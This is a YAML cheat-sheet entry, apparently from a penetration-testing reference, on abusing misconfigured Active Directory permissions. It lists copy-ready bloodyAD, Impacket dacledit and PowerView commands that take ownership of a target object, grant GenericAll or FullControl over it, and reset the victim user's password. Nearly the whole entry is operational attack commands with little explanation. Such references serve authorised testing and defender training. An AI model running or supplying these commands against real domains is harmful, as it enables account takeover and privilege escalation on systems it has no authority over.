---
description: |
  Active Directory ACL abuse — exploit misconfigured permissions (GenericAll, WriteDACL, WriteOwner) to escalate privileges.
commands:
  - have: Credentials
    cmd: |
      # bloodyAD — set yourself as owner of target object
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set owner targetuser sec_user

      # bloodyAD — grant GenericAll on target object
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add genericAll 'OU=YOURDN,DC=senshu,DC=sh' sec_user

      # bloodyAD — reset target user password
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set password targetuser 'NewP@ssw0rd!'

      # Impacket dacledit — modify DACLs
      impacket-dacledit senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target targetuser -action write -rights FullControl
  - have: Shell
    cmd: |
      # PowerView — set object owner
      Import-Module .\PowerView.ps1
      Set-DomainObjectOwner -Identity targetuser -OwnerIdentity sec_user

      # PowerView — grant GenericAll rights
      Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity sec_user -Rights All

      # PowerView — change target password after ACL abuse
      $cred = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
      Set-DomainUserPassword -Identity targetuser -AccountPassword $cred
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://github.com/CravateRouge/bloodyAD
  - https://github.com/fortra/impacket
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
---
